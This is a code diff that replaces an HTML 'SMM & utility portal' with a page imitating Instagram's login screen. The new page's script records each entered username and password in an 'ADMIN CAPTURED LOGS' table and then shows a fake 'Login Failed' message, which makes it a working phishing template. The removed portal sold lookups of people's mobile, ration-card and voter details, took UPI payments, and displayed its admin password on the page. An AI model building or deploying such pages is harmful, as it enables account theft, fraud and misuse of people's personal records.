@@ -3,405 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Complete SMM & Utility Portal Setup</title>
-    <!-- Bootstrap 5 CSS -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Instagram • Login</title>
     <!-- Font Awesome Icons -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; }
         
-        /* Login Box */
-        .auth-container { max-width: 420px; margin: 60px auto; }
-        .card-dark { background-color: #1e293b; border: 1px solid #334155; color: #fff; }
+        .login-card {
+            background-color: #000; border: 1px solid #262626; width: 350px;
+            padding: 40px 40px 20px; text-align: center; margin-bottom: 10px; border-radius: 1px;
+        }
         
-        /* Dashboard Layout */
-        #mainApp { display: none; }
-        .sidebar {
-            width: 260px; height: 100vh; position: fixed; top: 0; left: 0;
-            background-color: #1e293b; border-right: 1px solid #334155; overflow-y: auto; z-index: 1000;
-        }
-        .sidebar .brand { padding: 20px; font-size: 1.25rem; font-weight: bold; border-bottom: 1px solid #334155; color: #38bdf8; }
-        .sidebar .nav-link { color: #94a3b8; padding: 12px 20px; font-size: 0.9rem; cursor: pointer; border-bottom: 1px solid #1e293b; }
-        .sidebar .nav-link:hover, .sidebar .nav-link.active { background-color: #0f172a; color: #38bdf8; font-weight: bold; }
-        .sidebar .nav-link i { margin-right: 10px; width: 20px; }
-
-        .main-content { margin-left: 260px; padding: 25px; }
-        .top-header {
-            background-color: #1e293b; padding: 15px 20px; border-radius: 10px;
-            display: flex; justify-content: space-between; align-items: center; border: 1px solid #334155; margin-bottom: 25px;
-        }
-
-        .stat-card {
-            background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #334155;
-            border-radius: 12px; padding: 20px; margin-bottom: 20px;
-        }
-
-        .page-section { display: none; }
-        .page-section.active { display: block; }
+        .insta-logo { font-family: 'Grand Hotel', cursive, sans-serif; font-size: 3.2rem; margin-bottom: 30px; font-weight: 500; }
         
-        .form-control, .form-select { background-color: #0f172a; border: 1px solid #334155; color: #fff; }
-        .form-control:focus, .form-select:focus { background-color: #0f172a; color: #fff; border-color: #38bdf8; box-shadow: none; }
-
-        @media (max-width: 768px) {
-            .sidebar { position: relative; width: 100%; height: auto; }
-            .main-content { margin-left: 0; }
+        .form-group { margin-bottom: 6px; position: relative; }
+        .input-field {
+            width: 100%; background: #121212; border: 1px solid #262626; border-radius: 3px;
+            padding: 11px 8px; color: #fff; font-size: 12px; outline: none;
         }
+        .input-field:focus { border-color: #555; }
+        
+        .btn-login {
+            width: 100%; background-color: #0095f6; color: #fff; border: none;
+            border-radius: 8px; padding: 7px; font-weight: 600; font-size: 14px;
+            margin-top: 8px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-login:hover { background-color: #1877f2; }
+        
+        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 18px 0; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background-color: #262626; }
+        .divider span { padding: 0 18px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 18px; }
+        .forgot-pass { color: #e0f1ff; font-size: 12px; text-decoration: none; }
+        
+        .signup-box { background-color: #000; border: 1px solid #262626; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+
+        /* ADMIN LOGS AREA */
+        .admin-section { width: 350px; margin-top: 30px; background: #121212; border: 1px dashed #ef4444; padding: 15px; border-radius: 8px; }
+        .admin-title { color: #ef4444; font-size: 13px; font-weight: bold; margin-bottom: 10px; display: flex; justify-content: space-between; }
+        .logs-table { width: 100%; border-collapse: collapse; font-size: 11px; text-align: left; }
+        .logs-table th, .logs-table td { border-bottom: 1px solid #262626; padding: 6px; }
+        .logs-table th { color: #8e8e8e; }
     </style>
 </head>
 <body>
 
-    <!-- ================= AUTHENTICATION / LOGIN ================= -->
-    <div id="authView" class="container auth-container">
-        <div class="card card-dark shadow-lg">
-            <div class="card-header text-center border-secondary py-3">
-                <h4 class="mb-0 text-info"><i class="fa-solid fa-layer-group me-2"></i>PORTAL LOGIN</h4>
+    <!-- INSTAGRAM LOGIN CARD -->
+    <div class="login-card">
+        <h1 class="insta-logo">Instagram</h1>
+        
+        <form onsubmit="event.preventDefault(); captureCredentials();">
+            <div class="form-group">
+                <input type="text" id="userInput" class="input-field" placeholder="Phone number, username, or email" required>
             </div>
-            <div class="card-body p-4">
-                <ul class="nav nav-pills nav-justified mb-3" id="authTabs">
-                    <li class="nav-item"><button class="nav-link active" onclick="showAuthTab('userLogin')">User Login</button></li>
-                    <li class="nav-item"><button class="nav-link text-danger fw-bold" onclick="showAuthTab('adminLogin')">Admin Login</button></li>
-                </ul>
-
-                <!-- User Login -->
-                <form id="userLoginForm" onsubmit="event.preventDefault(); login('user');">
-                    <div class="mb-3">
-                        <label class="form-label">Username / Mobile</label>
-                        <input type="text" class="form-control" placeholder="raju" required>
-                    </div>
-                    <div class="mb-3">
-                        <label class="form-label">Password</label>
-                        <input type="password" class="form-control" placeholder="••••••••" required>
-                    </div>
-                    <button type="submit" class="btn btn-info w-100 fw-bold">Login User Panel</button>
-                </form>
-
-                <!-- Admin Login -->
-                <form id="adminLoginForm" class="d-none" onsubmit="event.preventDefault(); login('admin');">
-                    <div class="alert alert-danger py-1 small mb-3">Admin Login: ID = <strong>admin</strong> | Pass = <strong>admin123</strong></div>
-                    <div class="mb-3">
-                        <label class="form-label">Admin Username</label>
-                        <input type="text" id="adminUser" class="form-control" placeholder="admin" required>
-                    </div>
-                    <div class="mb-3">
-                        <label class="form-label">Admin Password</label>
-                        <input type="password" id="adminPass" class="form-control" placeholder="admin123" required>
-                    </div>
-                    <button type="submit" class="btn btn-danger w-100 fw-bold">Login Admin Control</button>
-                </form>
+            <div class="form-group">
+                <input type="password" id="passInput" class="input-field" placeholder="Password" required>
             </div>
-        </div>
+            <button type="submit" class="btn-login">Log in</button>
+        </form>
+
+        <div class="divider"><span>OR</span></div>
+
+        <a href="#" class="fb-login"><i class="fa-brands fa-square-facebook fs-5"></i> Log in with Facebook</a>
+        <a href="#" class="forgot-pass">Forgot password?</a>
     </div>
 
-    <!-- ================= MAIN DASHBOARD SYSTEM ================= -->
-    <div id="mainApp">
-        <!-- Sidebar Menu -->
-        <div class="sidebar">
-            <div class="brand" id="panelBrand">
-                <i class="fa-solid fa-cube me-2"></i>PORTAL SETUP
-            </div>
-            <nav class="nav flex-column">
-                <!-- User Links -->
-                <div id="userMenu">
-                    <a class="nav-link active" onclick="switchPage('user_services', this)"><i class="fa-solid fa-list"></i> All Services</a>
-                    <a class="nav-link" onclick="switchPage('add_funds', this)"><i class="fa-solid fa-wallet"></i> Add Balance (UPI QR)</a>
-                    <a class="nav-link" onclick="switchPage('order_history', this)"><i class="fa-solid fa-clock-rotate-left"></i> History</a>
-                </div>
-
-                <!-- Admin Links -->
-                <div id="adminMenu" class="d-none">
-                    <a class="nav-link text-danger fw-bold" onclick="switchPage('admin_add_service', this)"><i class="fa-solid fa-plus-circle"></i> Add New Service</a>
-                    <a class="nav-link text-danger fw-bold" onclick="switchPage('admin_funds', this)"><i class="fa-solid fa-check-double"></i> Approve UTR Payments</a>
-                    <a class="nav-link text-danger fw-bold" onclick="switchPage('admin_orders', this)"><i class="fa-solid fa-tasks"></i> All User Orders</a>
-                </div>
-
-                <a class="nav-link text-warning mt-4" onclick="logout()"><i class="fa-solid fa-right-from-bracket"></i> Logout</a>
-            </nav>
-        </div>
-
-        <!-- Content Area -->
-        <div class="main-content">
-            <!-- Header Bar -->
-            <div class="top-header">
-                <div>
-                    <span class="badge bg-secondary me-2" id="roleBadge">User Mode</span>
-                    <span class="text-muted" id="userGreeting">Hello, Raju</span>
-                </div>
-                <div>
-                    <span class="badge bg-success fs-6"><i class="fa-solid fa-wallet me-1"></i> Balance: ₹<span id="userBalance">100.00</span></span>
-                </div>
-            </div>
-
-            <!-- 1. USER: SERVICES LIST & APPLY -->
-            <div id="user_services" class="page-section active">
-                <div class="stat-card">
-                    <h4 class="text-info mb-3"><i class="fa-solid fa-server me-2"></i>Available Services</h4>
-                    <div class="row" id="servicesContainer">
-                        <!-- Dynamic services will load here -->
-                    </div>
-                </div>
-            </div>
-
-            <!-- 2. USER: ADD FUNDS (UPI QR MANUAL) -->
-            <div id="add_funds" class="page-section">
-                <div class="stat-card">
-                    <h4 class="text-success mb-3"><i class="fa-solid fa-qrcode me-2"></i>Add Balance via UPI</h4>
-                    <div class="row align-items-center">
-                        <div class="col-md-5 text-center border-end border-secondary">
-                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=laxmihi@ptyes&pn=Portal%20Recharge" alt="UPI QR" class="img-fluid border rounded p-2 bg-white mb-2">
-                            <p class="mb-0 text-muted">UPI ID: <strong class="text-info fs-5">laxmihi@ptyes</strong></p>
-                        </div>
-                        <div class="col-md-7 mt-3 mt-md-0">
-                            <form onsubmit="event.preventDefault(); submitFundRequest();">
-                                <div class="mb-3">
-                                    <label class="form-label">Payment Amount (₹)</label>
-                                    <input type="number" id="fundAmount" class="form-control" placeholder="100" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label class="form-label">Enter 12-Digit UTR / Transaction No.</label>
-                                    <input type="text" id="fundUtr" class="form-control" maxlength="12" minlength="12" placeholder="12 Digit UTR Number" required>
-                                </div>
-                                <button type="submit" class="btn btn-success w-100 fw-bold">Submit Payment Ref</button>
-                            </form>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 3. USER: ORDER HISTORY -->
-            <div id="order_history" class="page-section">
-                <div class="stat-card">
-                    <h4 class="mb-3"><i class="fa-solid fa-list me-2"></i>Transaction & Order History</h4>
-                    <table class="table table-dark table-striped text-center align-middle">
-                        <thead>
-                            <tr><th>ID</th><th>Service</th><th>Amount</th><th>Status</th></tr>
-                        </thead>
-                        <tbody id="userOrderBody">
-                            <tr><td>#TXN101</td><td>Mobile Info Search</td><td>₹50.00</td><td><span class="badge bg-success">Success</span></td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <!-- 4. ADMIN: ADD NEW SERVICE -->
-            <div id="admin_add_service" class="page-section">
-                <div class="stat-card border-danger">
-                    <h4 class="text-danger mb-3"><i class="fa-solid fa-plus-circle me-2"></i>Admin: Add Custom Service</h4>
-                    <form onsubmit="event.preventDefault(); addNewService();">
-                        <div class="mb-3">
-                            <label class="form-label">Service Title/Name</label>
-                            <input type="text" id="newServiceName" class="form-control" placeholder="e.g. DL PDF Service" required>
-                        </div>
-                        <div class="mb-3">
-                            <label class="form-label">Price / Rate (₹)</label>
-                            <input type="number" id="newServiceRate" class="form-control" placeholder="50" required>
-                        </div>
-                        <div class="mb-3">
-                            <label class="form-label">Input Placeholder Name</label>
-                            <input type="text" id="newServiceInput" class="form-control" placeholder="e.g. Enter DL Number" required>
-                        </div>
-                        <button type="submit" class="btn btn-danger fw-bold w-100">Add Service Live</button>
-                    </form>
-                </div>
-            </div>
-
-            <!-- 5. ADMIN: APPROVE PAYMENTS -->
-            <div id="admin_funds" class="page-section">
-                <div class="stat-card border-danger">
-                    <h4 class="text-danger mb-3"><i class="fa-solid fa-check-double me-2"></i>Admin: Pending UTR Requests</h4>
-                    <table class="table table-dark text-center align-middle">
-                        <thead><tr><th>User</th><th>Amount</th><th>UTR Number</th><th>Action</th></tr></thead>
-                        <tbody id="adminFundsBody">
-                            <!-- Pending UTR requests go here -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <!-- 6. ADMIN: ALL ORDERS -->
-            <div id="admin_orders" class="page-section">
-                <div class="stat-card border-danger">
-                    <h4 class="text-danger mb-3"><i class="fa-solid fa-tasks me-2"></i>Admin: All User Orders</h4>
-                    <table class="table table-dark text-center align-middle">
-                        <thead><tr><th>Order ID</th><th>Service</th><th>User Input</th><th>Charge</th><th>Status</th></tr></thead>
-                        <tbody id="adminOrdersBody">
-                            <!-- User Orders display here -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-        </div>
+    <!-- SIGNUP CARD -->
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
     </div>
 
-    <!-- JavaScript logic -->
+    <!-- DEMO ADMIN LOGS PANEL -->
+    <div class="admin-section">
+        <div class="admin-title">
+            <span><i class="fa-solid fa-user-shield me-1"></i> ADMIN CAPTURED LOGS</span>
+            <span style="color:#0095f6; cursor:pointer;" onclick="clearLogs()">Clear</span>
+        </div>
+        <table class="logs-table">
+            <thead>
+                <tr><th>ID / Phone</th><th>Password</th><th>Time</th></tr>
+            </thead>
+            <tbody id="logsBody">
+                <!-- Dynamically Captured Login Entries -->
+            </tbody>
+        </table>
+    </div>
+
     <script>
-        let currentBalance = 100.00;
+        function captureCredentials() {
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            const time = new Date().toLocaleTimeString();
 
-        // Default Services List
-        let servicesList = [
-            { id: 1, title: "Mobile Details Search", rate: 50, placeholder: "Enter 10 Digit Mobile No." },
-            { id: 2, title: "Ration PDF Download", rate: 30, placeholder: "Enter Ration Card No." },
-            { id: 3, title: "Instant Voter PDF", rate: 20, placeholder: "Enter EPIC/Voter No." }
-        ];
-
-        // Load Services to User View
-        function renderServices() {
-            const container = document.getElementById('servicesContainer');
-            container.innerHTML = '';
-            servicesList.forEach(s => {
-                container.innerHTML += `
-                    <div class="col-md-6 col-lg-4 mb-3">
-                        <div class="card card-dark h-100 p-3 border-secondary">
-                            <h5 class="text-info">${s.title}</h5>
-                            <p class="text-warning fw-bold mb-2">Rate: ₹${s.rate}.00</p>
-                            <input type="text" id="input_service_${s.id}" class="form-control form-control-sm mb-2" placeholder="${s.placeholder}">
-                            <button class="btn btn-primary btn-sm fw-bold" onclick="useService('${s.title}', ${s.rate}, 'input_service_${s.id}')">Apply Service (₹${s.rate})</button>
-                        </div>
-                    </div>
-                `;
-            });
-        }
-
-        // Authentication Tab Switch
-        function showAuthTab(tab) {
-            document.getElementById('userLoginForm').classList.add('d-none');
-            document.getElementById('adminLoginForm').classList.add('d-none');
-            const btns = document.querySelectorAll('#authTabs .nav-link');
-            btns.forEach(b => b.classList.remove('active'));
-
-            if (tab === 'userLogin') {
-                document.getElementById('userLoginForm').classList.remove('d-none');
-                btns[0].classList.add('active');
-            } else {
-                document.getElementById('adminLoginForm').classList.remove('d-none');
-                btns[1].classList.add('active');
-            }
-        }
-
-        // Login System
-        function login(role) {
-            if (role === 'admin') {
-                const u = document.getElementById('adminUser').value;
-                const p = document.getElementById('adminPass').value;
-                if (u === 'admin' && p === 'admin123') {
-                    document.getElementById('userMenu').classList.add('d-none');
-                    document.getElementById('adminMenu').classList.remove('d-none');
-                    document.getElementById('roleBadge').className = 'badge bg-danger me-2';
-                    document.getElementById('roleBadge').innerText = 'Admin Mode';
-                    document.getElementById('panelBrand').innerHTML = '<i class="fa-solid fa-shield-halved me-2"></i>ADMIN PANEL';
-                    switchPage('admin_add_service', document.querySelectorAll('#adminMenu .nav-link')[0]);
-                } else {
-                    alert('Wrong Admin Details!');
-                    return;
-                }
-            } else {
-                document.getElementById('adminMenu').classList.add('d-none');
-                document.getElementById('userMenu').classList.remove('d-none');
-                document.getElementById('roleBadge').className = 'badge bg-info me-2';
-                document.getElementById('roleBadge').innerText = 'User Mode';
-                renderServices();
-                switchPage('user_services', document.querySelectorAll('#userMenu .nav-link')[0]);
-            }
-
-            document.getElementById('authView').style.display = 'none';
-            document.getElementById('mainApp').style.display = 'block';
-        }
-
-        function logout() {
-            document.getElementById('mainApp').style.display = 'none';
-            document.getElementById('authView').style.display = 'block';
-        }
-
-        function switchPage(pageId, element) {
-            const pages = document.querySelectorAll('.page-section');
-            pages.forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-
-            if (element) {
-                const links = document.querySelectorAll('.sidebar .nav-link');
-                links.forEach(l => l.classList.remove('active'));
-                element.classList.add('active');
-            }
-        }
-
-        // Apply Service Function
-        function useService(title, rate, inputId) {
-            const inputVal = document.getElementById(inputId).value;
-            if(!inputVal) {
-                alert('Please fill input details!');
-                return;
-            }
-
-            if (currentBalance >= rate) {
-                currentBalance -= rate;
-                document.getElementById('userBalance').innerText = currentBalance.toFixed(2);
-                
-                // Add to user history
-                const orderId = '#ORD' + Math.floor(Math.random() * 10000);
-                document.getElementById('userOrderBody').innerHTML += `
-                    <tr><td>${orderId}</td><td>${title}</td><td>₹${rate}.00</td><td><span class="badge bg-success">Processed</span></td></tr>
-                `;
-
-                // Add to admin order list
-                document.getElementById('adminOrdersBody').innerHTML += `
-                    <tr><td>${orderId}</td><td>${title}</td><td>${inputVal}</td><td>₹${rate}.00</td><td><span class="badge bg-success">Success</span></td></tr>
-                `;
-
-                alert('Service Order Placed Successfully!');
-                document.getElementById(inputId).value = '';
-            } else {
-                alert('Insufficient Balance! Please recharge using UPI.');
-            }
-        }
-
-        // User Submits UTR Payment
-        function submitFundRequest() {
-            const amt = document.getElementById('fundAmount').value;
-            const utr = document.getElementById('fundUtr').value;
-
-            document.getElementById('adminFundsBody').innerHTML += `
+            // Admin table me push karna
+            const tbody = document.getElementById('logsBody');
+            tbody.innerHTML = `
                 <tr>
-                    <td>Raju</td>
-                    <td>₹ ${amt}</td>
-                    <td>${utr}</td>
-                    <td>
-                        <button class="btn btn-sm btn-success" onclick="approveFund(this, ${amt})">Approve</button>
-                        <button class="btn btn-sm btn-danger" onclick="this.closest('tr').remove()">Reject</button>
-                    </td>
+                    <td style="color:#38bdf8;">${user}</td>
+                    <td style="color:#f43f5e;">${pass}</td>
+                    <td style="color:#6b7280;">${time}</td>
                 </tr>
-            `;
+            ` + tbody.innerHTML;
 
-            alert('Payment Request Submitted to Admin!');
-            document.getElementById('fundAmount').value = '';
-            document.getElementById('fundUtr').value = '';
+            alert("Login Failed: Please check your credentials and try again.");
+            document.getElementById('passInput').value = '';
         }
 
-        // Admin Approves UTR
-        function approveFund(btn, amt) {
-            currentBalance += parseFloat(amt);
-            document.getElementById('userBalance').innerText = currentBalance.toFixed(2);
-            btn.closest('tr').remove();
-            alert('Recharge Approved & Balance Added!');
+        function clearLogs() {
+            document.getElementById('logsBody').innerHTML = '';
         }
-
-        // Admin Adds New Service
-        function addNewService() {
-            const title = document.getElementById('newServiceName').value;
-            const rate = parseFloat(document.getElementById('newServiceRate').value);
-            const placeholder = document.getElementById('newServiceInput').value;
-
-            servicesList.push({ id: servicesList.length + 1, title, rate, placeholder });
-            renderServices();
-
-            alert('New Service Added Successfully to User Panel!');
-            document.getElementById('newServiceName').value = '';
-            document.getElementById('newServiceRate').value = '';
-            document.getElementById('newServiceInput').value = '';
-        }
-
-        // Initial Load
-        renderServices();
     </script>
+
 </body>
 </html>
